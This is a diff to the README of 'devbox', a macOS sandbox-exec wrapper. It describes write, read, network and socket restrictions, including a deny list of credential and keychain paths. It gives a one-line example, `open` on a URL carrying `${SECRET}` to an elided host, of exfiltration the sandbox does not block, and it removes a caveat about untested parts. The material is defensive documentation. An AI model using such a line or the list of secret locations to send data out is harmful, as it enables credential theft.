@@ -21,39 +21,40 @@ devbox --print-profile            # see exactly what the profile says
 
 ## What it allows
 
-- **Writes** - the current directory, your per-user temp directory
-  (`getconf DARWIN_USER_TEMP_DIR`), `/tmp`, `/var/tmp`, and the
-  usual writable character devices. Nothing else: not your dotfiles, not
-  `~/.ssh/config`, not a launch agent, not another repo. Not `.git/config` or
-  `.git/hooks` either, even though they are inside the writable directory -
-  see below.
+Writes to current directory; reads anywhere; no network. Exceptions/details:
 
-- **Reads** - everything, *except* your credentials and your private data:
-  `~/.ssh`, `~/.gnupg`, `~/.aws`, `~/.kube`, `~/.docker`, `~/.netrc`,
-  `~/.npmrc`, `~/.config/gh`, `~/.claude` and friends; all of `~/Library`,
-  which holds the keychain, your cookies and your mail, with the developer
-  subtrees (`Developer`, `Caches`, `Fonts`, `Android`, `Python`, `pnpm`) given
-  back; other users' home directories; `/Volumes`, because a mounted Time
-  Machine disk is a copy of your home directory. `stat` is permitted
-  everywhere, so path-walking still works.
+- **Writes**: The current directory, your per-user temp directory (`getconf
+  DARWIN_USER_TEMP_DIR`), `/tmp`, `/var/tmp`, and the usual writable character
+  devices. Not `.git/config` or `.git/hooks` either, even though they are inside
+  the writable directory - see below.
 
-- **IP networking** - none, unless you pass `--network=yes`.
+- **Reads**: Everything except some well-known private files: `~/.ssh`,
+  `~/.gnupg`, `~/.aws`, `~/.kube`, `~/.docker`, `~/.netrc`, `~/.npmrc`,
+  `~/.config/gh`, `~/.claude` and friends; all of `~/Library`, which holds the
+  keychain, your cookies and your mail, with the developer subtrees
+  (`Developer`, `Caches`, `Fonts`, `Android`, `Python`, `pnpm`) given back;
+  other users' home directories; `/Volumes`, because a mounted Time Machine disk
+  is a copy of your home directory. `stat` is permitted everywhere, so
+  path-walking still works.
 
-- **Unix sockets** - syslog's, plus the DNS resolver's with `--network=yes`.
-  Nothing else, either way: sockets in shared directories reach programs that
-  run commands for whoever connects - tmux, the Emacs server, VS Code. That
-  includes `ssh-agent` and Docker, so `git push` over ssh won't work inside.
+- **IP networking**: None, unless you pass `--network=yes`.
 
-The two lists are shaped differently on purpose. "Files my dev environment
-reads" is long, personal and open-ended, and enumerating it produces a sandbox
-that breaks constantly and therefore stops being used; "files that are secrets"
-is short and nearly universal. Writes are the reverse: almost nothing
-legitimately writes outside the repo and its caches, so denying by default
-costs little and catches a lot.
+- **Unix sockets**: syslog's, plus the DNS resolver's with `--network=yes`.
+  Nothing else: sockets in shared directories reach programs that run commands
+  for whoever connects - tmux, the Emacs server, VS Code. That includes
+  `ssh-agent` and Docker, so `git push` over ssh won't work inside.
 
-The price is that a secret somewhere nobody listed stays readable. With the
-network off by default that is staged exfiltration rather than exfiltration,
-which is the trade being made.
+The read/write lists are shaped differently on purpose. "Files my dev
+environment reads" is long, personal and open-ended, and enumerating it produces
+a sandbox that breaks constantly and therefore stops being used; "files that are
+secrets" is short and nearly universal. Writes are the reverse: almost nothing
+legitimately writes outside the repo and its caches, so denying by default costs
+little and catches a lot.
+
+The price is that a secret somewhere nobody listed stays readable. Turning the
+network off by default makes exfiltration only slightly harder: e.g. `open
+"https://.../${SECRET}"` is not blocked. *Don't use devbox to contain serious
+attackers; it won't work.*
 
 Everything that is not a file or a socket - running programs, mach services,
 sysctls - is permitted, because the profile is `(allow default)` with
@@ -186,22 +187,8 @@ If you reach for the same flag twice, put it in `~/.config/devbox/allow-write`.
 
 ## Caveats
 
-- **Partly tested.** It runs: the profile compiles, `sandbox-exec` executes the
-  command, and the file rules behave as described - reads and writes outside
-  the policy are denied, link creation is checked against the source for both
-  read and write, `subpath` covers a plain file as well as a directory, and
-  `rename` needs write at both ends and read at neither, which is what
-  `allow-write` implying `allow-read` exists to be honest about. Not yet
-  exercised: the network stanza, where SBPL's spelling for unix-socket filters
-  has varied across releases; `--why`; and any real toolchain end to end. The profile is generated rather than hand-maintained, and
-  `--print-profile` shows exactly what `sandbox-exec` will be handed; if it
-  fails to compile, `sandbox-exec` refuses to run the command at all - it fails
-  closed.
-
-- **`sandbox-exec` is deprecated.** It has carried the notice since macOS 10.10
-  and still works in current releases; the underlying Seatbelt machinery is
-  what App Sandbox uses. Apple provides no supported replacement for wrapping
-  an arbitrary command, so the alternatives are this, a VM, or nothing.
-
-- **macOS only.** Anywhere else the script exits rather than running your
-  command unsandboxed.
+**macOS only**, and even there **`sandbox-exec` is officially deprecated**.
+Despite being deprecated since macOS 10.10 it still works in current releases;
+the underlying Seatbelt machinery is what App Sandbox uses. Apple provides no
+supported replacement for wrapping an arbitrary command, so the alternatives are
+this, a VM, or nothing.
